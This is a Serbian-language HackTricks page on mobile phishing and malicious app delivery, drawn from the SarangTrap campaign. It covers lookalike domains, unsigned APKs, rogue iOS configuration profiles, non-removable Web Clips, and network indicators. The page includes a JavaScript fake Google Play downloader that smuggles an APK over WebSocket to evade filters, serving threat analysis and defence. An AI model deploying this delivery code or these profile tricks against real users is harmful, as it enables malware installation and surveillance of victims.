# Mobilni phishing i distribucija zlonamernih aplikacija (Android i iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica obuhvata tehnike koje akteri pretnji koriste za distribuciju **zlonamernih Android APK-ova** i **iOS profila za mobilnu konfiguraciju** putem phishinga (SEO, socijalni inženjering, lažne prodavnice, aplikacije za upoznavanje itd.).
> Materijal je prilagođen prema kampanji SarangTrap, koju je razotkrio Zimperium zLabs (2025), i drugim javnim istraživanjima.<sup>[[1]](#references)</sup>

## Tok napada

1. **SEO/phishing infrastruktura**
   * Registruju se desetine domena koji liče na legitimne (upoznavanje, deljenje u oblaku, autoservis…).  
     – Koriste se ključne reči na lokalnom jeziku i emodžiji u elementu `<title>` radi boljeg rangiranja na Google-u.  
     – Na istoj odredišnoj stranici hostuju se uputstva za instalaciju i za Android (`.apk`) i za iOS.
2. **Preuzimanje prve faze**
   * Android: direktna veza ka nepotpisanom APK-u ili APK-u iz „prodavnice treće strane“.  
   * iOS: veza `itms-services://` ili obična HTTPS veza ka zlonamernom profilu **mobileconfig** (pogledajte ispod).
3. **Ponašanje Android malware-a nakon instalacije**
   * Izvršavanje kontrolisano preko C2, zloupotreba dozvola, zaobilaženje dropper-a, prikupljanje podataka u pozadini i druga ponašanja malware-a nakon instalacije obrađena su na posebnoj stranici Android Malware Post-Exploitation ispod.
4. **Tehnika isporuke za iOS**
   * Jedan **profil za mobilnu konfiguraciju** može da zatraži `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. kako bi upisao uređaj u nadzor nalik „MDM“-u.  
   * Uputstva zasnovana na socijalnom inženjeringu:
     1. Otvorite Settings ➜ *Profil je preuzet*.
     2. Dodirnite *Instaliraj* tri puta (snimci ekrana su na phishing stranici).  
     3. Verujte nepotpisanom profilu ➜ napadač dobija ovlašćenja za *Contacts* i *Photo* bez provere App Store-a.
5. **Korisni teret iOS Web Clip-a (ikona phishing aplikacije)**
   * Korisni tereti `com.apple.webClip.managed` mogu da **prikače phishing URL na početni ekran** sa brendiranom ikonom/nazivom.
   * Web Clips mogu da rade **preko celog ekrana** (skrivajući korisnički interfejs pregledača) i mogu biti označeni kao **neuklonjivi**, tako da žrtva mora da izbriše profil da bi uklonila ikonu.<sup>[[3]](#references)</sup>
6. **Mrežni sloj**
   * Običan HTTP, često na portu 80, sa HOST zaglavljem kao što je `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS-a → lako se uočava).

## Android Malware Post-Exploitation

Za Android malware taktike nakon instalacije, kao što su C2, zloupotreba Accessibility-ja, overlay-ji, ATS automatizacija, učitavanje etapnog DEX-a, premium SMS i postojanost, pogledajte:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK krijumčarenje zasnovano na Socket.IO/WebSocket-u + lažne Google Play stranice

Napadači sve češće zamenjuju statične APK veze Socket.IO/WebSocket kanalom ugrađenim u mamce koji izgledaju kao Google Play. Time se prikriva URL korisnog tereta, zaobilaze filteri za URL-ove/ekstenzije i zadržava realističan doživljaj instalacije.<sup>[[2]](#references)[[4]](#references)</sup>

Uobičajeni tok klijenta zabeležen u praksi:

<details>
<summary>Lažni Play downloader zasnovan na Socket.IO-u (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Zašto izmiče jednostavnim kontrolama:
- Ne izlaže se statički APK URL; payload se rekonstruiše u memoriji iz WebSocket frame-ova.
- Filteri za URL/MIME/ekstenzije koji blokiraju direktne .apk odgovore mogu da ne prepoznaju binarne podatke tunelovane preko WebSocket-a/Socket.IO-a.
- Crawler-i i URL sandbox-i koji ne izvršavaju WebSocket veze neće preuzeti payload.

Pogledajte i WebSocket tradecraft i alate:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Mračna strana romanse: SarangTrap kampanja iznude](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Podešavanja Web Clips payloada za Apple uređaje](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Bankarski trojanac cilja Android korisnike u Indoneziji i Vijetnamu](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
